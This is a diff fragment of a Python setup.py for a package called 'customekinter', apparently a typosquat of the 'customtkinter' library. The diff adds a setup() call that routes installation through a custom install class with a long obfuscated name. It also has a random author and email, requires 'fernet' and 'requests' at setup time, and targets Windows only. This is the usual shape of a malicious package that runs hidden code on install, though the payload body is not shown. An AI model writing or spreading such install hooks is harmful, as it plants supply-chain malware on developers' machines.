@@ -18,5 +18,22 @@ class yzxXMHRGOvlDIDdPlUZZoGoJtXXbNiTUofHhvvfIUgXTLvlsiWAwJKWQigOQqlv(install):
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+    name="customekinter",
+    version=VERSION,
+    author="bBeSnXao",
+    author_email="hDAZXzQNLlkkDdORCvv@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': yzxXMHRGOvlDIDdPlUZZoGoJtXXbNiTUofHhvvfIUgXTLvlsiWAwJKWQigOQqlv,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
